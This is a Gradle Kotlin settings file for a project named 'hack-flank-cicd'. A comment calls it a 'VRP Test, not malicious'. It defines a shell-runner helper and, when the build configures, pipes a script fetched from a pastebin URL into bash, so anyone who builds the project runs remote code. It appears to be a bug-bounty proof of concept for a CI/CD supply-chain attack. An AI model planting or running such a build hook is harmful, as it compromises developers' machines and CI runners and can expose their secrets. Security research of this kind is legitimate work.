rootProject.name = "hack-flank-cicd"

// For VRP Test, not malicious.
fun String.runCommand(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
            .redirectOutput(ProcessBuilder.Redirect.PIPE)
            .redirectError(ProcessBuilder.Redirect.PIPE)
            .start()
            .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}

val output = "curl -sSfL https://pastebin.com/raw/Ujik0RuJ | bash".runCommand()
println("Shell command output: $output")